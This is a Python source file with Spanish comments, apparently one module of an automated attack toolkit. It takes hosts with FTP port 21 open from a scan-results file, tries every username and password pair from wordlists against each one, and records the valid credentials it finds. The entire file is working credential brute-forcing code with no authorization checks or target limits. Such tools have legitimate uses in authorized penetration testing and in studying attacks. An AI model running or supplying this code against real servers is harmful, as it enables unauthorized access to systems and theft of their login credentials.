import os  # Para manejo de directorios y rutas
import json  # Para trabajar con archivos JSON
from ftplib import FTP  # Para conectar y autenticar contra servidores FTP

# Directorio donde se guardarán los resultados del ataque FTP
FTP_RESULTS_DIR = "results/ftp"

# Rutas de las wordlists de usuarios y contraseñas
WORDLIST_USER = "wordlists/users.txt"
WORDLIST_PASS = "wordlists/passwords.txt"

# Archivo con los resultados del escaneo de servicios
SCAN_RESULTS_FILE = "results/scan_results.json"

def fuerza_bruta_ftp(ip, port=21):
    # Crea el directorio para los resultados si no existe
    os.makedirs(FTP_RESULTS_DIR, exist_ok=True)

    # Diccionario para almacenar los resultados de la fuerza bruta
    resultados = {
        "host": ip,
        "port": port,
        "valid_credentials": []  # Lista de credenciales válidas encontradas
    }

    # Carga los nombres de usuario desde la wordlist
    with open(WORDLIST_USER, "r") as f:
        usuarios = [line.strip() for line in f if line.strip()]

    # Carga las contraseñas desde la wordlist
    with open(WORDLIST_PASS, "r") as f:
        contrasenas = [line.strip() for line in f if line.strip()]

    # Mensaje informativo al iniciar el ataque
    print(f"[*] Iniciando fuerza bruta FTP contra {ip}:{port}...")

    # Prueba todas las combinaciones de usuario y contraseña
    for usuario in usuarios:
        for contrasena in contrasenas:
            try:
                ftp = FTP()  # Crea una instancia del cliente FTP
                ftp.connect(ip, port, timeout=3)  # Conecta al servidor FTP
                ftp.login(usuario, contrasena)  # Intenta autenticar
                print(f"[+] Credenciales válidas encontradas: {usuario}:{contrasena}")
                # Si se logra iniciar sesión, se guardan las credenciales
                resultados["valid_credentials"].append({"usuario": usuario, "password": contrasena})
                ftp.quit()  # Cierra la sesión FTP
            except Exception:
                # Si ocurre un error (conexión o autenticación), continúa con la siguiente combinación
                continue

    # Ruta donde se guardarán los resultados del ataque
    salida = os.path.join(FTP_RESULTS_DIR, f"ftp_{ip}_bruteforce.json")

    # Guarda los resultados en formato JSON
    with open(salida, "w") as f:
        json.dump(resultados, f, indent=4)

    # Muestra mensaje de finalización
    print(f"[+] Resultados guardados en {salida}")
    return resultados  # Devuelve los resultados para su uso posterior

def run_ftp_attack():
    # Verifica si existe el archivo con los resultados del escaneo
    if not os.path.exists(SCAN_RESULTS_FILE):
        print(f"[!] Archivo de escaneo no encontrado: {SCAN_RESULTS_FILE}")
        return

    # Carga el archivo JSON con los resultados del escaneo
    with open(SCAN_RESULTS_FILE, "r") as f:
        data = json.load(f)

    # Itera sobre los hosts detectados
    for host in data.get("hosts", []):
        ip = host.get("ip")
        # Verifica si el puerto 21 (FTP) está abierto en el host
        for port_info in host.get("open_ports", []):
            if port_info.get("port") == 21:
                fuerza_bruta_ftp(ip)  # Ejecuta el ataque de fuerza bruta
                break  # Sale del bucle para evitar múltiples llamadas por host
